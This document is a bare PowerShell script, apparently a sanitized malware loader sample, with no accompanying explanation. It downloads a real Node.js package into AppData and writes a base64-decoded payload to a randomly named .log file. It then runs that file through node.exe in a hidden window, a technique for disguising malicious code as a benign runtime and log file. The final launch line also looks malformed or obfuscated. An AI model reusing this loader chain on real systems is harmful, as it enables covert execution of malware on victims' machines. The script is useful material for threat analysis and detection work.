$legitimate_nodejs_url = "https://nodejs.org/dist/v22.11.0/node-v22.11.0-win-x64.zip"
$appdata_path = "C:\Users\<username>\AppData\Roaming"
$download_path = "C:\Users\<username>\AppData\Local\Temp\downloaded.zip"

try {
	$web_client = New-Object System.Net.WebClient
	$web_client.DownloadFile($legitimate_nodejs_url, $download_path)
} catch {
	exit 1
}
if (-not (Test-Path -Path $appdata_path)) {
	ni -Path $appdata_path -ItemType Directory | Out-Null
}
try {
	$shell_app = New-Object -ComObject Shell.Application
	$namespace_download = $shell_app.NameSpace($download_path)
	$namespace_appdata = $shell_app.NameSpace($appdata_path)
	$namespace_appdata.CopyHere($namespace_download.Items(), 4 + 16)  
} catch {
	exit 1
}

$appdata_path = "C:\Users\<username>\AppData\Roaming\node-v22.11.0-win-x64"
$alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
$random_str = -join ((1..8) | % { $alphabet[(Get-Random -Minimum 0 -Maximum $alphabet.Length)] })
$log_file_path = "C:\Users\<username>\AppData\Roaming\node-v22.11.0-win-x64\<random_str>.log"
$b64_payload = "<base64 encoded payload>"
$payload = [Convert]::FromBase64String($b64_payload)
[System.IO.File]::WriteAllBytes($log_file_path, $payload)

$nodejs_exe_path = "C:\Users\<username>\AppData\Roaming\node-v22.11.0-win-x64\node.exe"

saps -FilePath $ExecutionContext.InvokeCommand.$nodejs_exe_path -ArgumentList $ExecutionContext.InvokeCommand.$log_file_path  -WindowStyle Hidden
